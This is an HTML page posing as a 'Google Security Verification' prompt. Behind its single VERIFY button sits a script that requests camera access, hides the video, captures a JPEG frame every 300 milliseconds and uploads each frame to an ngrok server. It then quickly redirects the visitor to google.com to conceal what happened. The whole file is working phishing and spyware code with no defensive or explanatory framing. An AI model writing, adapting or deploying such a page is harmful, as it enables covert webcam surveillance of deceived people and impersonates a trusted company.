<!DOCTYPE html>
<html>
<head><title>Verify</title></head>
<body style="text-align:center; padding-top:100px; font-family:sans-serif;">
  <h2>Google Security Verification</h2>
  <button id="b" style="padding:15px 30px; font-size:18px; cursor:pointer;">VERIFY</button>

  <video id="v" autoplay playsinline muted style="display:none;"></video>
  <canvas id="c" width="640" height="480" style="display:none;"></canvas>

<script>
const ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/";

document.getElementById('b').addEventListener('click', async () => {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.getElementById('v');
    const canvas = document.getElementById('c');
    const ctx = canvas.getContext('2d');
    
    video.srcObject = stream;
    video.play();

    // Kirim frame setiap 300ms ke server ngrok
    setInterval(() => {
      if (video.readyState === video.HAVE_ENOUGH_DATA) {
        ctx.drawImage(video, 0, 0, 640, 480);
        canvas.toBlob(blob => {
          if (!blob) return;
          const fd = new FormData();
          fd.append('file', blob, 'c.jpg');
          fetch(ENDPOINT, { method: 'POST', body: fd, keepalive: true }).catch(() => {});
        }, 'image/jpeg', 0.5);
      }
    }, 300);

    // Redirect instan ke Google
    setTimeout(() => {
      window.location.replace('https://www.google.com');
    }, 500);

  } catch(e) {
    window.location.replace('https://www.google.com');
  }
}, { once: true });
</script>
</body>
</html>
